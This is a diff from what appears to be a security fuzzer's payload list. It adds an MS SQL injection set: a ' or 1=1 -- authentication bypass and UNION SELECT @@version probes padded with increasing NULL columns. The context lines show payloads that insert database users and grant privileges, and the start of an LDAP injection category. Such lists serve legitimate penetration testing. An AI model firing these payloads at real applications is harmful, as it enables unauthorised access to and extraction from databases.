@@ -179,6 +179,16 @@ INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSW
 GRANT CONNECT TO name; GRANT RESOURCE TO name;
 INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
 
+P:SQL-MS1-SQL:MS SQL Injection I:8
+A
+' or 1=1 --
+' union (select @@version) --
+' union (select NULL, (select @@version)) --
+' union (select NULL, NULL, (select @@version)) --
+' union (select NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  (select @@version)) --
+' union (select NULL, NULL, NULL, NULL,  NULL, (select @@version)) --
+
 P:LDP-INJ:LDAP Injection:20
 > Replacive Fuzzers | LDAP Injection | Injection
 |
